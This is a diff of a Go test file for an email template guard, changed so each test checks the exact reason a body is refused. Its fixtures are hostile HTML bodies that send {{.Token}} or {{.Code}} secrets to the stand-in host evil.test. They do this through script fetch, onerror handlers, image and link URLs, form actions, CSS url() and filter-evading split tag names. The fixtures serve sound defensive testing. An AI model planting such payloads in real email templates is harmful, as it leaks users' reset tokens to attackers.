@@ -136,20 +136,28 @@ func TestRejectControlBytes(t *testing.T) {
 
 // The element allowlist. Every entry here is a family the mail client would act
 // on by itself, and an allowlist rejects them by omission rather than by name.
+//
+// Each case names the element the walker must refuse it as, so a body that is
+// refused by the attribute rule or the secret rule instead does not read as the
+// element allowlist holding.
 func TestGuardElementAllowlist(t *testing.T) {
-	for _, body := range []string{
-		`<script>x</script>`,
-		`<scr{{"ipt"}}>fetch("https://evil.test?t="+{{.Token}})</scr{{"ipt"}}>`,
-		`<iframe src="https://evil.test"></iframe>`,
-		`<ob{{"ject"}} data="https://evil.test"></ob{{"ject"}}>`,
-		`<ba{{"se"}} href="https://evil.test/">`,
-		`<li{{"nk"}} rel="stylesheet" href="https://evil.test/s.css">`,
-		`<sv{{"g"}}><use href="https://evil.test"/></sv{{"g"}}>`,
-		`<fo{{"rm"}} action="https://evil.test"><input name="t" value="{{.Token}}"></fo{{"rm"}}>`,
-		`<vid{{"eo"}} poster="https://evil.test/p?t={{.Token}}"></vid{{"eo"}}>`,
-		`<no{{"script"}}><img src="https://evil.test/x"></no{{"script"}}>`,
+	for _, tc := range []struct{ elem, body string }{
+		{"script", `<script>x</script>`},
+		{"script", `<scr{{"ipt"}}>fetch("https://evil.test?t="+{{.Token}})</scr{{"ipt"}}>`},
+		{"iframe", `<iframe src="https://evil.test"></iframe>`},
+		{"object", `<ob{{"ject"}} data="https://evil.test"></ob{{"ject"}}>`},
+		{"base", `<ba{{"se"}} href="https://evil.test/">`},
+		{"link", `<li{{"nk"}} rel="stylesheet" href="https://evil.test/s.css">`},
+		{"svg", `<sv{{"g"}}><use href="https://evil.test"/></sv{{"g"}}>`},
+		{"form", `<fo{{"rm"}} action="https://evil.test"><input name="t" value="{{.Token}}"></fo{{"rm"}}>`},
+		{"video", `<vid{{"eo"}} poster="https://evil.test/p?t={{.Token}}"></vid{{"eo"}}>`},
+		{"noscript", `<no{{"script"}}><img src="https://evil.test/x"></no{{"script"}}>`},
 	} {
-		guardBad(t, body)
+		err := guardBad(t, tc.body)
+		want := "<" + tc.elem + "> is not on the email template allowlist"
+		if !strings.Contains(err.Error(), want) {
+			t.Errorf("%q was refused as %v, want the element allowlist to name %s", tc.body, err, want)
+		}
 	}
 	guardOK(t, `<table><tr><td align="center"><p><strong>hi</strong></p></td></tr></table>`)
 }
@@ -206,31 +214,46 @@ func TestScanStartTagRefusesWhatItCannotTokenise(t *testing.T) {
 	}
 }
 
+// Each case names the refusal the attribute must draw. Several of these carry a
+// secret as well, and the secret rule would refuse them too -- pinning the
+// reason is what keeps the attribute allowlist itself under test.
 func TestGuardAttributeAllowlist(t *testing.T) {
-	for _, body := range []string{
-		`<img src="https://ok.test/x" on{{"error"}}="fetch('https://evil.test?t={{.Token}}')">`,
-		`<table><tr><td background="https://evil.test/p?t={{.Token}}">x</td></tr></table>`,
-		`<img src="https://ok.test/x" srcset="https://evil.test/p?t={{.Token}} 2x">`,
-		`<img src="https://ok.test/x" longdesc="https://evil.test/p?t={{.Token}}">`,
-		`<p data-token="{{.Token}}">x</p>`,
-		`<meta http-equiv="refresh" content="0;url=https://evil.test">`,
+	for _, tc := range []struct{ want, body string }{
+		{`event handler "onerror" on <img>`, `<img src="https://ok.test/x" on{{"error"}}="fetch('https://evil.test?t={{.Token}}')">`},
+		{`"background" on <td> is not on the email template allowlist`, `<table><tr><td background="https://evil.test/p?t={{.Token}}">x</td></tr></table>`},
+		{`"srcset" on <img> is not on the email template allowlist`, `<img src="https://ok.test/x" srcset="https://evil.test/p?t={{.Token}} 2x">`},
+		{`"longdesc" on <img> is not on the email template allowlist`, `<img src="https://ok.test/x" longdesc="https://evil.test/p?t={{.Token}}">`},
+		{`"data-token" on <p> is not on the email template allowlist`, `<p data-token="{{.Token}}">x</p>`},
+		{`"http-equiv" on <meta> is not on the email template allowlist`, `<meta http-equiv="refresh" content="0;url=https://evil.test">`},
 	} {
-		guardBad(t, body)
+		err := guardBad(t, tc.body)
+		if !strings.Contains(err.Error(), tc.want) {
+			t.Errorf("%q was refused as %v, want a refusal naming %s", tc.body, err, tc.want)
+		}
 	}
 	guardOK(t, `<meta charset="utf-8"><meta name="viewport" content="width=device-width">`)
 }
 
 // A secret belongs in the body text, never in a value the client resolves.
 func TestGuardRefusesSecretsInResolvedValues(t *testing.T) {
-	for _, body := range []string{
-		`<img src="https://evil.test/p?t={{.Token}}">`,
-		`<a href="https://evil.test/p?c={{.Code}}">Reset Password</a>`,
-		`<a href="https://evil.test/?u={{.URL}}">Reset</a>`,
-		`<a href="{{.URL}}/{{.Token}}">Reset</a>`,
-		`<div style="background:ur{{"l"}}(https://evil.test/p?t={{.Token}})">x</div>`,
-		`<a href="https&#58;//evil.test/p?t={{.Token}}">Reset</a>`,
+	const resolved = "into a value the mail client resolves"
+	for _, tc := range []struct{ want, body string }{
+		{resolved, `<img src="https://evil.test/p?t={{.Token}}">`},
+		{resolved, `<a href="https://evil.test/p?c={{.Code}}">Reset Password</a>`},
+		// The link nested in a query parameter never reaches the attribute
+		// walker: html/template percent-encodes it there, so the canary no
+		// longer matches itself and the two renders stop being identical.
+		{"changes with the value", `<a href="https://evil.test/?u={{.URL}}">Reset</a>`},
+		{resolved, `<a href="{{.URL}}/{{.Token}}">Reset</a>`},
+		// CSS is refused a step earlier and for a wider reason: no style value
+		// may reference anything off the message, secret or not.
+		{`contains "url"`, `<div style="background:ur{{"l"}}(https://evil.test/p?t={{.Token}})">x</div>`},
+		{resolved, `<a href="https&#58;//evil.test/p?t={{.Token}}">Reset</a>`},
 	} {
-		guardBad(t, body)
+		err := guardBad(t, tc.body)
+		if !strings.Contains(err.Error(), tc.want) {
+			t.Errorf("%q was refused as %v, want a refusal naming %s", tc.body, err, tc.want)
+		}
 	}
 	// A secret in body text is the point of the mail. In an attribute it is not:
 	// no attribute needs one, so none may carry one and the walker never has to
@@ -432,7 +455,13 @@ func TestGuardBodiesCoversBothOverrideShapes(t *testing.T) {
 // The masking placeholders must not be reachable as literal template output,
 // or a template could write one and be read as a substituted secret.
 func TestGuardRefusesTemplatesThatWriteAPlaceholder(t *testing.T) {
-	guardBad(t, "<a href=\"\x01u\x01\">Reset</a>")
+	// checkEmailURL accepts phURL in an href, so the control-byte check on the
+	// render is the only thing standing between this body and being read as the
+	// configured link. Pin that it is what refuses it.
+	err := guardBad(t, "<a href=\"\x01u\x01\">Reset</a>")
+	if !strings.Contains(err.Error(), "control byte") {
+		t.Errorf("err = %v, want the render refused for carrying a control byte", err)
+	}
 }
 
 // html/template strips HTML comments from its output and escapes a '<' that
